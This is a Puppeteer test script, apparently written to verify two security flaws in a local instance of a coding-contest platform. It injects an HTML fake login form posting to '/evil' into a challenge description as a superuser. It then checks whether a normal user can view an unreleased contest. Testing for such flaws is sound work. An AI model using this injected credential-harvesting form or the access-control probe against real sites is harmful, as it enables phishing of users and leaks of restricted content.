import puppeteer from 'puppeteer';

const createUrl = (endpoint) => `http://127.0.0.1:2005${endpoint}`;

const login = async (page) => {
  await page.goto(createUrl('/auth/discord'));
  await page.waitForSelector('.em_container', { timeout: 0 });
  const cookies = await page.cookies();
  const cookie = cookies.find((c) => c.name === 'engineerman.sid');
  return `${cookie.name}=${cookie.value}`;
};

// Get superuser cookie
console.log('Log in with an account that has superuser permissions');
console.log(
  "If you don't have one, create an account and give it superuser permissions through `./emkc mysql`"
);
const superUserBrowser = await puppeteer.launch({
  headless: false,
  userDataDir: './test'
});
const superUserPage = await superUserBrowser.newPage();
const superUserCookie = await login(superUserPage);
console.log({ superUserCookie });

// Create future contest
await fetch(createUrl('/admin/contests/create'), {
  credentials: 'include',
  headers: {
    Accept: 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Content-Type': 'application/json;charset=utf-8',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    Cookie: superUserCookie
  },
  body: '{"name":"Future contest","description":"{\\"ops\\":[{\\"insert\\":\\"Future contest\\\\n\\"}]}","start_date":"2025-04-14 17:00:00","end_date":"2025-04-17 17:00:00","input":"asd","output":"asd","disallowed_languages":"awk,basic.net,csharp.net,python2,python2,awk,dotnet,csharp.net,basic.net"}',
  method: 'POST',
  mode: 'cors'
});

await superUserPage.goto(createUrl('/admin/contests'));

// Get future contest url
await superUserPage.waitForSelector('td.actions');
const futureContestEndpoint = await superUserPage.$eval(
  'td.actions:first-child a:nth-child(2)',
  (element) => element.getAttribute('href')
);
console.log({ futureContestUrl: futureContestEndpoint });

// Create an XSS injected challenge
{
  console.log('XSS Attack');

  const body = {
    draft: 0,
    difficulty: 1,
    points: 10,
    name: 'XSS injected',
    description: 'XSS injected',
    html: `
        <form action="/evil" method="post">
        <label>Username</label>
        <input type="text">
        <label>Password</label>
        <input type="password">
        <input type="submit" value="Log in">
        </form>
        `,
    tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
  };

  const res = await fetch(createUrl('/admin/challenges/create'), {
    credentials: 'include',
    headers: {
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'no-cors',
      'Sec-Fetch-Site': 'same-origin',
      'Content-Type': 'application/json;charset=utf-8',
      Pragma: 'no-cache',
      'Cache-Control': 'no-cache',
      Cookie: superUserCookie
    },
    body: JSON.stringify(body),
    method: 'POST',
    mode: 'cors'
  });

  console.log({ statusText: res.statusText });
  console.log(
    'If the attack is successful, you will see a new challenge called "XSS injected" with an unsafe form'
  );
}

await superUserPage.close();
await superUserBrowser.close();

// Get normal user cookie
const userBrowser = await puppeteer.launch({
  headless: false,
  userDataDir: './test2'
});
const userPage = await userBrowser.newPage();
console.log('Log in as a normal user');
await login(userPage);


// as normal user, access future contest
{
  console.log('Viewing a future contest as an unauthorized user attack');
  await userPage.goto(createUrl(futureContestEndpoint));
  await userPage.waitForSelector('.em_contests_contest');
  await userPage.screenshot({ path: './future-contest.jpg' });
  console.log(
    'If the attack is successful, there will be a screenshot called future-contest.jpg with the content of the future contest'
  );
}

await userPage.close();
await userBrowser.close();
